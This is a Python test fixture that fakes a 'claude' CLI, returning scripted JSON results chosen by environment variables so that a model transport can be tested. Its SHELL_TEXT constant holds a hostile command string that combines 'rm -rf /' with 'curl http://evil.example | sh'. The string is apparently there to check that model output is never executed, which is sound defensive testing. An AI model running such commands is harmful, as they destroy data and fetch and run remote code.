"""
A fake `claude` CLI, for testing the CLI model transport without spending a
subscription. It is launched as `python fake_cli_model.py <the real flags>`, so
the flags the provider builds reach it unchanged.

Behaviour is scripted through env vars:

    FAKE_CLI_LOG=<path>       append one JSON line per run: argv, stdin, env keys
    FAKE_CLI_MODE=ok          a JSON result "pong" with cost and usage (default)
                 signed_out   `is_error` result saying the CLI is not logged in
                 empty        a JSON result whose text is ""
                 shell        a result that LOOKS like a command line
                 tool_attempt a result that reports a denied tool request
                 error_rate   `is_error` result saying a usage limit was hit
                 not_json     plain text instead of JSON
                 hang         never answer
    FAKE_CLI_LOGGED_IN=1|0    what `auth status` reports (default 1)
"""
import json
import os
import sys
import time

SHELL_TEXT = "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"


def main() -> int:
    argv = sys.argv[1:]
    if argv[:2] == ["auth", "status"]:
        logged_in = os.getenv("FAKE_CLI_LOGGED_IN", "1") == "1"
        print(json.dumps({"loggedIn": logged_in, "authMethod": "claude.ai"}))
        return 0 if logged_in else 1
    stdin = sys.stdin.read()
    log = os.getenv("FAKE_CLI_LOG")
    if log:
        with open(log, "a", encoding="utf-8") as fh:
            fh.write(json.dumps({"argv": argv, "stdin": stdin,
                                 "env": sorted(os.environ), "cwd": os.getcwd()}) + "\n")
    mode = os.getenv("FAKE_CLI_MODE", "ok")
    if mode == "hang":
        time.sleep(3600)
    if mode == "not_json":
        print("this is not json")
        return 0
    doc = {"type": "result", "is_error": False, "result": "pong", "num_turns": 1,
           "total_cost_usd": 0.000984, "permission_denials": [],
           "usage": {"input_tokens": 472, "cache_read_input_tokens": 100,
                     "output_tokens": 4,
                     "output_tokens_details": {"thinking_tokens": 2}},
           "modelUsage": {"claude-sonnet-5-5": {"costUSD": 0.000984}}}
    if mode == "signed_out":
        doc.update(is_error=True, result="Not logged in · Please run /login")
    elif mode == "error_rate":
        doc.update(is_error=True, result="5-hour usage limit reached")
    elif mode == "empty":
        doc["result"] = ""
    elif mode == "shell":
        doc["result"] = SHELL_TEXT
    elif mode == "tool_attempt":
        doc["permission_denials"] = [{"tool_name": "Bash", "tool_input": {"command": "id"}}]
    print(json.dumps(doc))
    return 1 if doc["is_error"] else 0


if __name__ == "__main__":
    sys.exit(main())
